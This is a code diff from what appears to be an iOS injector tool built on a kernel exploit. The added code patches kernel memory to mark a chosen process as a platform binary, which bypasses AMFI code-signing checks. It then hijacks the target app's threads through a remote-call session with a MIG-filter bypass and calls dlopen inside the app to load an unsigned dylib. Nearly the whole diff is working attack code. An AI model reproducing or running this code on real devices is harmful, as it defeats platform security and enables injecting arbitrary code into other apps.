@@ -15,9 +15,30 @@
 #import "kexploit/kutils.h"
 #import "kexploit/offsets.h"
 #import "kexploit/vnode.h"
+#import "kexploit/xpaci.h"
 #import "utils/sandbox.h"
 #import "utils/file.h"
 #import "TaskRop/RemoteCall.h"
+#import "research/amfi_research.h"
+
+// Code Signing Flags (from XNU bsd/sys/codesign.h)
+#define CS_VALID            0x00000001  // dynamically valid
+#define CS_ADHOC            0x00000002  // ad hoc signed
+#define CS_GET_TASK_ALLOW   0x00000004  // has get-task-allow entitlement
+#define CS_INSTALLER        0x00000008  // has installer entitlement
+#define CS_FORCED_LV        0x00000010  // Library Validation required by Hardened Runtime
+#define CS_INVALID_ALLOWED  0x00000020  // allow invalid pages (for debugging)
+#define CS_HARD             0x00000100  // don't load invalid pages
+#define CS_KILL             0x00000200  // kill process if invalid pages
+#define CS_CHECK_EXPIRATION 0x00000400
+#define CS_RESTRICT         0x00000800  // restrict VM access
+#define CS_ENFORCEMENT      0x00001000  // require enforcement
+#define CS_REQUIRE_LV       0x00002000  // require library validation
+#define CS_ENTITLEMENTS_VALIDATED 0x00004000
+#define CS_RUNTIME          0x00010000  // Hardened Runtime
+#define CS_DEBUGGED         0x10000000  // process is being debugged
+#define CS_PLATFORM_BINARY  0x04000000  // is platform binary
+#define CS_PLATFORM_PATH    0x08000000  // platform path
 
 // Device support check - same as Cyanide
 static NSComparisonResult injector_compare_system_version(NSString *version) {
@@ -200,18 +221,86 @@ static void injector_log_device_info(void) {
     return YES;
 }
 
-#pragma mark - Injection
+#pragma mark - AMFI Bypass
+
+// Bypass AMFI code signing for target process to allow loading unsigned dylibs
+- (BOOL)bypassAMFIForProcess:(pid_t)pid {
+    NSLog(@"[Injector] Bypassing AMFI for PID %d...", pid);
+
+    // Step 1: Find process
+    uint64_t proc = proc_find(pid);
+    if (!proc || !is_kaddr_valid(proc)) {
+        NSLog(@"[Injector] Cannot find process %d", pid);
+        return NO;
+    }
+    NSLog(@"[Injector] Found proc at 0x%llx", proc);
+
+    // Step 2: Get credential label
+    uint64_t label = proc_get_cred_label(proc);
+    if (!label || !is_kaddr_valid(label)) {
+        NSLog(@"[Injector] Cannot get credential label");
+        return NO;
+    }
+    NSLog(@"[Injector] Credential label at 0x%llx", label);
+
+    // Step 3: Get AMFI slot (OSEntitlements*)
+    uint64_t amfi_slot = amfi_cslot_get(label);
+    if (!amfi_slot || !is_kaddr_valid(amfi_slot)) {
+        NSLog(@"[Injector] Cannot get AMFI slot");
+        return NO;
+    }
+    NSLog(@"[Injector] AMFI slot (OSEntitlements) at 0x%llx", amfi_slot);
+
+    // Step 4: Read OSEntitlementsState pointer (offset +0x10)
+    uint64_t state = kread64(amfi_slot + 0x10);
+    state = xpaci(state);
+    if (!state || !is_kaddr_valid(state)) {
+        NSLog(@"[Injector] Cannot get OSEntitlementsState");
+        return NO;
+    }
+    NSLog(@"[Injector] OSEntitlementsState at 0x%llx", state);
+
+    // Step 5: Read current is_cs_platform value (offset +0x4A)
+    uint8_t current_platform = kread8(state + 0x4A);
+    NSLog(@"[Injector] Current is_cs_platform = %d", current_platform);
+
+    // Step 6: Set is_cs_platform = 1 to bypass code signing checks
+    if (current_platform != 1) {
+        kwrite8(state + 0x4A, 1);
+
+        // Verify write succeeded
+        uint8_t new_platform = kread8(state + 0x4A);
+        if (new_platform != 1) {
+            NSLog(@"[Injector] Failed to patch is_cs_platform");
+            return NO;
+        }
+        NSLog(@"[Injector] Patched is_cs_platform: %d -> %d", current_platform, new_platform);
+    } else {
+        NSLog(@"[Injector] Process already marked as platform binary");
+    }
+
+    // Also set valid flag (offset +0x48)
+    uint8_t valid = kread8(state + 0x48);
+    if (valid != 1) {
+        kwrite8(state + 0x48, 1);
+        NSLog(@"[Injector] Set valid flag to 1");
+    }
+
+    NSLog(@"[Injector] AMFI bypass successful for PID %d!", pid);
+    return YES;
+}
+
+#pragma mark - Runtime Injection (dlopen approach - no kernel panic)
 
 - (BOOL)injectDylib:(NSString *)dylibPath
             intoApp:(NSDictionary *)appInfo
               error:(NSError **)error {
 
     NSFileManager *fm = [NSFileManager defaultManager];
-    NSString *appPath = appInfo[@"path"];
     NSString *bundleID = appInfo[@"bundleID"];
     NSString *appName = appInfo[@"name"];
 
-    NSLog(@"[Injector] Starting injection into %@ (%@)", appName, bundleID);
+    NSLog(@"[Injector] Starting RUNTIME injection into %@ (%@)", appName, bundleID);
 
     // Step 1: Run exploit if not ready
     if (!_exploitReady) {
@@ -227,111 +316,174 @@ static void injector_log_device_info(void) {
         }
     }
 
-    // Step 3: Get actual app path if empty
-    if (!appPath || appPath.length == 0) {
-        appPath = [self getAppPathForBundleID:bundleID];
-        if (!appPath) {
-            *error = [NSError errorWithDomain:@"InjectorError" code:3
-                                     userInfo:@{NSLocalizedDescriptionKey: @"Cannot find app path"}];
+    // Step 3: Copy dylib to app's Documents (accessible by target app)
+    NSString *appDataPath = [self getAppDataPathForBundleID:bundleID];
+    if (!appDataPath) {
+        // Fallback: use shared container
+        appDataPath = @"/var/mobile/Library/Caches";
+    }
+
+    NSString *dylibName = [dylibPath lastPathComponent];
+    NSString *targetDylibPath = [appDataPath stringByAppendingPathComponent:dylibName];
+
+    // Also try Documents subfolder
+    NSString *docsPath = [appDataPath stringByAppendingPathComponent:@"Documents"];
+    if ([fm fileExistsAtPath:docsPath]) {
+        targetDylibPath = [docsPath stringByAppendingPathComponent:dylibName];
+    }
+
+    [fm removeItemAtPath:targetDylibPath error:nil];
+    NSError *copyError = nil;
+    if (![fm copyItemAtPath:dylibPath toPath:targetDylibPath error:&copyError]) {
+        // Try alternative location
+        NSString *tmpPath = [NSString stringWithFormat:@"/var/tmp/%@", dylibName];
+        [fm removeItemAtPath:tmpPath error:nil];
+        if (![fm copyItemAtPath:dylibPath toPath:tmpPath error:&copyError]) {
+            *error = [NSError errorWithDomain:@"InjectorError" code:5
+                                     userInfo:@{NSLocalizedDescriptionKey:
+                [NSString stringWithFormat:@"Cannot copy dylib: %@", copyError.localizedDescription]}];
+            return NO;
+        }
+        targetDylibPath = tmpPath;
+    }
+    NSLog(@"[Injector] Dylib copied to: %@", targetDylibPath);
+
+    // Make dylib executable
+    chmod(targetDylibPath.UTF8String, 0755);
+
+    // Step 4: Launch the app if not running
+    NSLog(@"[Injector] Launching app %@...", bundleID);
+    Class LSWorkspace = NSClassFromString(@"LSApplicationWorkspace");
+    if (LSWorkspace) {
+        [[LSWorkspace defaultWorkspace] openApplicationWithBundleID:bundleID];
+    }
+
+    // Wait for app to start
+    usleep(1500000); // 1.5 seconds
+
+    // Step 5: Find the running process
+    NSString *executableName = [self getExecutableNameForBundleID:bundleID];
+    if (!executableName) {
+        *error = [NSError errorWithDomain:@"InjectorError" code:6
+                                 userInfo:@{NSLocalizedDescriptionKey: @"Cannot find executable name"}];
+        return NO;
+    }
+    NSLog(@"[Injector] Looking for process: %@", executableName);
+
+    // Step 6: Create RemoteCallSession to target app
+    RemoteCallSession *session = [[RemoteCallSession alloc] initWithProcess:executableName
+                                                          useMigFilterBypass:YES
+                                                     firstExceptionTimeoutMS:5000];
+
+    if (!session || ![session hasLocalState]) {
+        // Retry with bundle ID as process name
+        session = [[RemoteCallSession alloc] initWithProcess:bundleID
+                                            useMigFilterBypass:YES
+                                       firstExceptionTimeoutMS:5000];
+
+        if (!session || ![session hasLocalState]) {
+            *error = [NSError errorWithDomain:@"InjectorError" code:7
+                                     userInfo:@{NSLocalizedDescriptionKey:
+                [NSString stringWithFormat:@"Cannot connect to %@. Make sure app is running.", appName]}];
             return NO;
         }
     }
+    NSLog(@"[Injector] Connected to process PID=%d", session.pid);
 
-    NSLog(@"[Injector] App path: %@", appPath);
+    // Step 7: Bypass AMFI to allow loading unsigned dylibs
+    if (![self bypassAMFIForProcess:session.pid]) {
+        NSLog(@"[Injector] Warning: AMFI bypass may have failed, dlopen might not work");
+        // Continue anyway - some apps might already have the right entitlements
+    }
 
-    // Get executable name from Info.plist
-    NSString *infoPlistPath = [appPath stringByAppendingPathComponent:@"Info.plist"];
-    NSDictionary *infoPlist = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
-    NSString *executableName = infoPlist[@"CFBundleExecutable"];
-
-    if (!executableName) {
-        *error = [NSError errorWithDomain:@"InjectorError" code:4
-                                 userInfo:@{NSLocalizedDescriptionKey: @"Cannot find CFBundleExecutable"}];
+    // Step 8: Write dylib path to remote memory
+    uint64_t trojanMem = session.trojanMem;
+    if (!trojanMem) {
+        [session destroyRemoteCall];
+        *error = [NSError errorWithDomain:@"InjectorError" code:8
+                                 userInfo:@{NSLocalizedDescriptionKey: @"No trojan memory available"}];
         return NO;
     }
 
-    NSString *originalBinaryPath = [appPath stringByAppendingPathComponent:executableName];
-    NSLog(@"[Injector] Original binary: %@", originalBinaryPath);
-
-    // Step 4: Create our injection directory in Documents (writable)
-    NSString *docsDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
-    NSString *injectDir = [docsDir stringByAppendingPathComponent:@"Injected"];
-    NSString *appInjectDir = [injectDir stringByAppendingPathComponent:bundleID];
-
-    [fm createDirectoryAtPath:appInjectDir withIntermediateDirectories:YES attributes:nil error:nil];
-
-    // Step 5: Copy dylib to our writable directory
-    NSString *dylibName = [dylibPath lastPathComponent];
-    NSString *localDylibPath = [appInjectDir stringByAppendingPathComponent:dylibName];
-
-    [fm removeItemAtPath:localDylibPath error:nil];
-    NSError *copyError = nil;
-    if (![fm copyItemAtPath:dylibPath toPath:localDylibPath error:&copyError]) {
-        *error = [NSError errorWithDomain:@"InjectorError" code:5
-                                 userInfo:@{NSLocalizedDescriptionKey:
-            [NSString stringWithFormat:@"Cannot copy dylib: %@", copyError.localizedDescription]}];
+    // Use offset in trojan memory for the path string
+    uint64_t pathAddr = trojanMem + 0x1000; // Safe offset
+    if (![session remoteWriteString:pathAddr value:targetDylibPath.UTF8String]) {
+        [session destroyRemoteCall];
+        *error = [NSError errorWithDomain:@"InjectorError" code:9
+                                 userInfo:@{NSLocalizedDescriptionKey: @"Cannot write dylib path to remote memory"}];
         return NO;
     }
-    NSLog(@"[Injector] Dylib copied to: %@", localDylibPath);
+    NSLog(@"[Injector] Wrote dylib path at 0x%llx", pathAddr);
 
-    // Step 6: Create patched binary in our directory
-    NSString *patchedBinaryPath = [appInjectDir stringByAppendingPathComponent:executableName];
-    [fm removeItemAtPath:patchedBinaryPath error:nil];
+    // Step 9: Call dlopen in target process
+    // dlopen(const char *path, int mode) - RTLD_NOW = 0x2
+    NSLog(@"[Injector] Calling dlopen(\"%@\", RTLD_NOW)...", targetDylibPath);
 
-    NSData *binaryData = [NSData dataWithContentsOfFile:originalBinaryPath];
-    if (!binaryData) {
+    uint64_t handle = [session doRemoteCallStableWithTimeout:10000
+                                               functionName:"dlopen"
+                                                         x0:pathAddr
+                                                         x1:0x2 // RTLD_NOW
+                                                         x2:0
+                                                         x3:0
+                                                         x4:0
+                                                         x5:0
+                                                         x6:0
+                                                         x7:0];
+
+    if (handle == 0) {
+        // dlopen failed, try to get error
+        NSLog(@"[Injector] dlopen returned NULL, calling dlerror...");
+
+        uint64_t errAddr = [session doRemoteCallStableWithTimeout:5000
+                                                    functionName:"dlerror"
+                                                              x0:0 x1:0 x2:0 x3:0 x4:0 x5:0 x6:0 x7:0];
+
+        NSString *errMsg = @"dlopen failed (unknown error)";
+        if (errAddr != 0) {
+            char errBuf[256] = {0};
+            if ([session remoteRead:errAddr to:errBuf size:255]) {
+                errMsg = [NSString stringWithFormat:@"dlopen failed: %s", errBuf];
+            }
+        }
+
+        [session destroyRemoteCall];
         *error = [NSError errorWithDomain:@"InjectorError" code:10
-                                 userInfo:@{NSLocalizedDescriptionKey: @"Cannot read original binary"}];
+                                 userInfo:@{NSLocalizedDescriptionKey: errMsg}];
         return NO;
     }
-
-    NSMutableData *mutableData = [binaryData mutableCopy];
-
-    // Patch to load our dylib using absolute path
-    NSString *loadPath = localDylibPath; // Use absolute path to our dylib
-    if (![self patchBinaryData:mutableData toLoadDylib:loadPath error:error]) {
-        return NO;
-    }
-
-    if (![mutableData writeToFile:patchedBinaryPath atomically:YES]) {
-        *error = [NSError errorWithDomain:@"InjectorError" code:13
-                                 userInfo:@{NSLocalizedDescriptionKey: @"Cannot write patched binary"}];
-        return NO;
-    }
-    NSLog(@"[Injector] Patched binary created: %@", patchedBinaryPath);
-
-    // Step 7: Use vnode redirect to swap original binary with patched one
-    NSLog(@"[Injector] Redirecting vnode...");
-
-    uint64_t orig_vnode = 0, orig_vdata = 0;
-    if (!vnode_redirect_file(originalBinaryPath.UTF8String, patchedBinaryPath.UTF8String,
-                             &orig_vnode, &orig_vdata)) {
-        *error = [NSError errorWithDomain:@"InjectorError" code:14
-                                 userInfo:@{NSLocalizedDescriptionKey: @"Vnode redirect failed"}];
-        return NO;
-    }
-
-    // Save redirect info for later restoration
-    NSMutableDictionary *redirectInfo = [NSMutableDictionary dictionary];
-    redirectInfo[@"bundleID"] = bundleID;
-    redirectInfo[@"orig_vnode"] = @(orig_vnode);
-    redirectInfo[@"orig_vdata"] = @(orig_vdata);
-    redirectInfo[@"originalBinaryPath"] = originalBinaryPath;
-    redirectInfo[@"patchedBinaryPath"] = patchedBinaryPath;
-    redirectInfo[@"dylibPath"] = localDylibPath;
-
-    NSString *redirectInfoPath = [appInjectDir stringByAppendingPathComponent:@"redirect_info.plist"];
-    [redirectInfo writeToFile:redirectInfoPath atomically:YES];
 
     NSLog(@"[Injector] ========================================");
     NSLog(@"[Injector] INJECTION SUCCESSFUL!");
-    NSLog(@"[Injector] Vnode redirected: %@ -> %@", originalBinaryPath, patchedBinaryPath);
-    NSLog(@"[Injector] Dylib: %@", localDylibPath);
+    NSLog(@"[Injector] dlopen returned handle: 0x%llx", handle);
+    NSLog(@"[Injector] Dylib loaded: %@", targetDylibPath);
+    NSLog(@"[Injector] Process: %@ (PID %d)", executableName, session.pid);
     NSLog(@"[Injector] ========================================");
-    NSLog(@"[Injector] RESTART THE APP TO LOAD DYLIB");
-    NSLog(@"[Injector] Note: Redirect is active until reboot");
+
+    // Keep session alive - don't destroy it immediately
+    // The dylib is now loaded and running
 
     return YES;
+}
+
+- (NSString *)getAppDataPathForBundleID:(NSString *)bundleID {
+    Class LSProxy = NSClassFromString(@"LSApplicationProxy");
+    if (!LSProxy) return nil;
+
+    id proxy = [LSProxy applicationProxyForIdentifier:bundleID];
+    if (proxy) {
+        NSURL *url = [proxy dataContainerURL];
+        return url.path;
+    }
+    return nil;
+}
+
+- (NSString *)getExecutableNameForBundleID:(NSString *)bundleID {
+    NSString *appPath = [self getAppPathForBundleID:bundleID];
+    if (!appPath) return nil;
+
+    NSString *infoPlistPath = [appPath stringByAppendingPathComponent:@"Info.plist"];
+    NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
+    return info[@"CFBundleExecutable"];
 }
 
 // Patch binary data (in-memory) to add LC_LOAD_DYLIB
